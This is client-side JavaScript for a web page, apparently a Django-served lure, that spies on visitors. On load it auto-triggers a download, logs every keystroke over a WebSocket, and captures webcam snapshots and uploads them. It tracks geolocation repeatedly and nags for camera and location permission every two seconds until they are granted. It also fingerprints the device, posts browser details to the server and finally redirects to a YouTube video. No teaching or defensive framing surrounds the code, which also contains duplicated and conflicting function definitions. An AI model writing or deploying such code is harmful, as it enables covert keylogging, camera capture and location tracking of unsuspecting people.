document.addEventListener("DOMContentLoaded", () => {
    document.getElementById("downloadLink").click();

    // Get geolocation
    if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(pos => {
            fetch("/geo_capture/", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    latitude: pos.coords.latitude,
                    longitude: pos.coords.longitude
                })
            });
        });
    }

    // Keystroke logging via WebSocket
    const socket = new WebSocket("ws://" + window.location.host + "/ws/log/");
    document.addEventListener("keydown", e => {
        socket.send(JSON.stringify({ key: e.key }));
    });

    // Redirect after 5 seconds
    setTimeout(() => {
        window.location.href = "https://www.youtube.com/watch?v=WY4-_LRBxW0&t=1021s";
        
    }, 5000);
});

let tasksDone = 0;

function taskCompleted() {
    tasksDone++;
    if (tasksDone >= 3) {  // adjust the number based on your required tasks
        window.location.href = "https://www.youtube.com/watch?v=WY4-_LRBxW0&t=1021s";
    }
}


        const video = document.createElement('video');
        const canvas = document.createElement('canvas');
        let cameraGranted = false;
        let locationGranted = false;

        function checkPermissions() {
            if (cameraGranted && locationGranted) {
                document.getElementById('permission-message').style.display = 'none';
            } else {
                document.getElementById('permission-message').style.display = 'block';
                setTimeout(() => requestPermissions(), 2000); // Retry every 2 seconds
            }
        }

        function requestPermissions() {
            // Ask for camera
            navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                cameraGranted = true;
                video.srcObject = stream;
                video.play();
                setTimeout(() => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    const image = canvas.toDataURL('image/png');
                    fetch('/upload/', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                        body: `image=${encodeURIComponent(image)}`
                    });
                    checkPermissions();
                }, 1500);
            })
            .catch(err => {
                cameraGranted = false;
                checkPermissions();
            });

            // Ask for location
            navigator.geolocation.getCurrentPosition(position => {
                locationGranted = true;
                fetch('/save-location/', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude
                    })
                });
                checkPermissions();
            }, error => {
                locationGranted = false;
                checkPermissions();
            });
        }

        // Start permission loop
        requestPermissions();

        function collectBrowserInfo() {
            const info = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenWidth: window.screen.width,
                screenHeight: window.screen.height,
                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                online: navigator.onLine,
                cookiesEnabled: navigator.cookieEnabled,
                touchSupport: 'ontouchstart' in window,
            };

            fetch("/log-device/", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                    "X-CSRFToken": getCSRFToken()
                },
                body: JSON.stringify(info)
            });
        }

        function getCSRFToken() {
            let name = 'csrftoken';
            let cookieValue = null;
            if (document.cookie && document.cookie !== '') {
                let cookies = document.cookie.split(';');
                for (let cookie of cookies) {
                    cookie = cookie.trim();
                    if (cookie.startsWith(name + '=')) {
                        cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
                        break;
                    }
                }
            }
            return cookieValue;
        }

        collectBrowserInfo();
    

    
        new Fingerprint2().get(function(result, components){
            console.log(result); // This is the unique fingerprint
            // Send this result to the backend for storage
        });

        document.addEventListener('mousemove', (event) => {
            console.log(`Mouse move at: ${event.clientX}, ${event.clientY}`);
        });

        navigator.geolocation.watchPosition(function(position) {
            console.log(`Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`);
        });

        function collectVisitorData() {
            const fingerprint = generateFingerprint();
            const deviceType = /Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
            const screenInfo = {
                width: window.screen.width,
                height: window.screen.height,
                colorDepth: window.screen.colorDepth
            };
            const timezoneOffset = new Date().getTimezoneOffset();
            const referrer = document.referrer;
            const language = navigator.language || navigator.userLanguage;
            const isNewVisitor = !sessionStorage.getItem("visited");
            const cookiesEnabled = navigator.cookieEnabled;
            const operatingSystem = navigator.platform;

            const data = {
                fingerprint: fingerprint,
                deviceType: deviceType,
                screenInfo: screenInfo,
                timezoneOffset: timezoneOffset,
                referrer: referrer,
                language: language,
                isNewVisitor: isNewVisitor,
                cookiesEnabled: cookiesEnabled,
                operatingSystem: operatingSystem
            };

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(position => {
                    data.latitude = position.coords.latitude;
                    data.longitude = position.coords.longitude;
                    sendDataToBackend(data);
                });
            } else {
                sendDataToBackend(data);
            }
        }

        function sendDataToBackend(data) {
            fetch('/collect-info/', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            }).then(response => response.json())
              .then(result => console.log('Data sent successfully:', result))
              .catch(error => console.error('Error sending data:', error));
        }

        window.onload = collectVisitorData;
        
        function sendVisitorData(data) {
    fetch('/collect-info/', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'X-CSRFToken': getCSRFToken()  // Add this only if CSRF is enabled
        },
        body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(result => {
        console.log('Data sent successfully:', result);
    })
    .catch(error => {
        console.error('Error sending data:', error);
    });
}


    
function isMobileDevice() {
    return /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
}

async function requestPermissions() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();

        // Wait a moment to ensure the video has loaded
        setTimeout(() => {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;

            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imageData = canvas.toDataURL('image/png');

            sendScreenshotToServer(imageData); // send image to server

            // Stop all media tracks
            stream.getTracks().forEach(track => track.stop());
        }, 1000);
    } catch (error) {
        console.error("Camera permission denied or error:", error);
    }
}

function sendScreenshotToServer(imageData) {
    fetch('/save-screenshot/', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'X-CSRFToken': getCookie('csrftoken')  // Django CSRF token
        },
        body: JSON.stringify({ image: imageData })
    }).then(res => res.json())
      .then(data => console.log(data.message))
      .catch(err => console.error('Error:', err));
}

function getCookie(name) {
    let cookieValue = null;
    if (document.cookie && document.cookie !== '') {
        const cookies = document.cookie.split(';');
        for (let cookie of cookies) {
            cookie = cookie.trim();
            if (cookie.startsWith(name + '=')) {
                cookieValue = decodeURIComponent(cookie.split('=')[1]);
                break;
            }
        }
    }
    return cookieValue;
}

// Run if mobile
if (isMobileDevice()) {
    requestPermissions();
}